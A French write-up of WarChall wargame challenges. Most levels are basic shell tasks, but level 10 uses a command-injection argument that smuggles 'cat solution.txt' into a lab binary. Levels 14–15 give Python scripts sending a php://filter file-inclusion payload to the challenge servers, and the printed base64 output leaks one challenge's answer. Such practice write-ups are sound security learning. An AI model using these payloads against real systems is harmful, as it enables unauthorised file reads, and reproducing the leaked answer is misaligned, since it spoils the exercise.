## 00_welcome

La solution pour ce premier challenge warchall se trouve dans le fichier README.md. Pour affichier son contenu, on peut utiliser la commande cat:
```
cat README.md
```

## 01_choice_tree
Pour commencer ce challenge, il faut d'abord executer la commande __ls__ pour voir le contenu du repertoire actuelle. On a plusieurs dossier et pour eviter de fouiller chaque dossier pour trouver la solution, on peput executer la commande :
```
du -b -a
```
qui affiche tout les contenues des dossier et sous-dossier. On peut apercevoir alors une fichier SOLUION.txt dans __blue/hats/grey/solution/patience__ et pour voir son contenu il suffit juste d'executer la commande :
```
cat ./blue/hats/grey/solution/patience/SOLUTION.txt
```
## 02
Comme on a fait dans le challenge précédent, on execute directe la commande 
```
du -b -a
```
pour voir tout son contenu. Sur la sortie affiché, après avoir examiné tout les contenu avec la command __cat__, on peut trouver la solution dans __./.porb/.solution__

## 03

Dans ce challenge, si on commence avec la commande __ls__ ce qui liste le contenu du repertoire, rien ne s'affiche à la sortie, donc le resultat est probablement dans un fichier caché. Pour afficher ce fichier caché on execute la commande:
```
ls -al
```
ce qui liste tout le contenue du repertoire et les autorisations qui vont avec, y compris les fichier cachés. On peut alors voir un fichier nommé __bash_history__ et pour voir son contenu il suffit de faire:
```
cat ./.bash_history
```
Et on a notre flag

## 04_kwisatz 

Dans ce repertoire on a deux fichier: __README2.txt__ et __README2.md__, dans le fichier README2.txt, il y a un texte indiquant qu'il y a quelque chose de spéciale dans README2.md, si on execute la commande cat sur ce fichier, il affiche __no read permission__ ce qui veut dire que ce fichier n'a pas d'autorisation de lecture, pour ajouter cette autorisation, il faut executer la commande __chmod__ suivie de __+r__ qui signifie read:
```
chmod +r README2.md
```
Avec les autorisation ajouté nous pouvons maintenant voir son contenu et avoir notre flag.
```
cat README2.md
```

## 05_privacy

Dans ce challenge, il y a un fichier README.md dans le repertoire, il suffit juste donc d'executer la commande cat sur le fichier pour voir son contenu, rien de plus.


## 10_choose_your_path

#### Étape 1 : Allez dans /home/level/10_choose_your_path.

Il y a 04 fichiers dans ce répertoire, mais nous nous intéressons ici à charp.c (le fichier de code C), charp l'exécutable compilé de charp.c et solution.txt.

La clé de ce niveau est de parvenir à faire en sorte que charp produise une sortie d'échec de sortie.

#### Étape 2 : Créez un fichier dans votre répertoire utilisateur en exécutant cette commande : touch /home/user/username/un_fichier.

Il faut remplacer username par le nom utilisé dans le serveur, ici mon nom est judicael ce qui fait que je dois execute la commande:
```
touch /home/user/judicael/un_fichier
```

Étape 3 : Maintenant, vous devez écrire cette ligne de commande : 

```
./charp "randomWords; cat solution.txt > /home/user/judicael/un_fichier.
```

Voici ce que fait cette commande: 

    Le premier argument [randomWords] : mettez simplement un mot aléatoire là-dedans, ce premier argument est nécessaire pour remplir la condition de produire un EXIT_FAILURE.
    Deuxième argument [solution.txt>~/un_fichier] : cet argument envoie le contenu de solution.txt vers le fichier que nous avons créé à l'étape 2 après l'échec de sortie


On obtien ceci dans la sortie: 

```
Counting randomWords; cat solution.txt> /home/user/judicael/yourfile ... 
/usr/bin/wc: randomWords: No such file or directory
Cannot scan! Sorry!
/usr/bin/wc: randomWords: No such file or directory
Cannot scan! Sorry!
Floating point exception
```
Exactement ce que l'on souhaite. Maintenant on va dans le repertoire ou on a créer notre fichier de toute à l'heure, c'est à dire dans __/home/user/judicael/__ , et il ne reste plus qu'à afficher le contenu du fichier avec la commande cat:

```
cat un_fichier
```
Le contenu est ceci (le flag est censuré):

    #!/C:\windows\system32\ed

    Congratulations hacker,

    You have achieved what only a few achieve.
    Kinda.

    The flag or solution for this challenge is: ***************

## 11_choose_your_path2


## 12_pytong

Pour avoir notre flag sur ce challenge, il nous faut executer un fichier executable __pytong__ présent dans ce repertoire suivie de quelques arguments.

```
./pytong <(echo foo)>
```
Il affiche alors dans la sortie des text et juste en bas il y a une ligne __\<?php return '********************'?>__, les étoiles est une phrase qui est notre flag, mais il ne faut pas l'afficher dans le write up

## 14_live_fi

Pour ce challenge nous avons besoin d'envoyer une requête spécifique à l'url du challenge: __http://lfi.warchall.net/index.php__ .Pour se faire, nous allons utiliser le script python ci-dessous:

```Python
import requests


url = "http://lfi.warchall.net/index.php"

params = {
    "lang": "php://filter/convert.base64-encode/resource=solution.php"
}

r = requests.get(url, params=params, verify=False)
print (r.content)

```

Ce code envoye une requete à l'url et accéder au fichier solution.php en le convertissant en base 64. En executant le code, on obtient dans la sortie ceci :

```
PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K
```
Pour le moment cela ne ressemble pas au flag qu'on recherche, et pourtant c'est notre flag mais il faut encore le décoder. Comment faire? C'est simple il existe sur internet des sites qui propose ce genre de service. Après avoir décodé notre flag, on obtien du texte lissible, y compris notre flag.

## 15_live_rfi

Les étapes pour trouver le flag pour ce challenge est le même que pour __14_live_fi__ , la seul différence est l'url pour faire la requête. Il faut donc faire un petit changement dans notre code python

```Python
import requests

url = "http://rfi.warchall.net/index.php"

params = {
    "lang": "php://filter/convert.base64-encode/resource=solution.php"
}

r = requests.get(url, params=params, verify=False)
print (r.content)

```
Ensuite il faut juste décoder la sortie obtenu.
